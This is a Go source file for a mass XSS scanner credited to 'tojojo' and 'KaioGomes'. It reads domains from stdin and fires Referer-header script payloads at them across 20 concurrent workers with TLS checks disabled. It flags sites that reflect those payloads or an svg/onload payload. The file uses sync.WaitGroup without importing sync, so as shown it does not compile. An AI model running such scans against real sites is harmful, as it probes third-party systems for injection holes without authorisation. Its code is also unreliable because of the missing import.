package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func main() {
	fmt.Println("\n")
	fmt.Println("Frequester tool By tojojo v2 !!")
	fmt.Println("Enhanced by KaioGomes")
	fmt.Println("\n")

	colorReset := "\033[0m"
	colorRed := "\033[31m"
	colorGreen := "\033[32m"

	silent := flag.Bool("silent", false, "display findings only")
	flag.Parse()

	sc := bufio.NewScanner(os.Stdin)

	jobs := make(chan string)
	var wg sync.WaitGroup

	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for domain := range jobs {
				checkRefererXSS(domain, silent, colorRed, colorGreen, colorReset)
				checkQueryXSS(domain, silent, colorRed, colorGreen, colorReset)
			}
		}()
	}
	for sc.Scan() {
		domain := sc.Text()
		jobs <- domain
	}
	close(jobs)
	wg.Wait()
}

func checkRefererXSS(domain string, silent *bool, colorRed, colorGreen, colorReset string) {
	transCfg := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}
	client := &http.Client{
		Transport: transCfg,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("GET", domain, nil)
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Add("Referer", `https://www.google.com/search?hl=en&q=testing'"()&%<acx><ScRiPt>alert(9534)</ScRiPt>`)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	checkResult := doc.Find("html").Text()
	if strings.Contains(checkResult, "'\"()&%<acx><ScRiPt>alert(9534)</ScRiPt>") {
		fmt.Println(string(colorRed), "[REFERER XSS] - Vulnerable To XSS:", domain, string(colorReset))
	} else {
		if !*silent {
			fmt.Println(string(colorGreen), "[REFERER XSS] - Not Vulnerable To XSS:", domain, string(colorReset))
		}
	}
}

func checkQueryXSS(domain string, silent *bool, colorRed, colorGreen, colorReset string) {
	transCfg := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}
	client := &http.Client{
		Transport: transCfg,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("GET", domain, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	checkResult := doc.Find("html").Text()
	if strings.Contains(checkResult, "\"><svg/onload=alert(1)") {
		fmt.Println(string(colorRed), "[QUERY] - Vulnerable To XSS:", domain, string(colorReset))
	} else {
		if !*silent {
			fmt.Println(string(colorGreen), "[QUERY] - Not Vulnerable To XSS:", domain, string(colorReset))
		}
	}
}
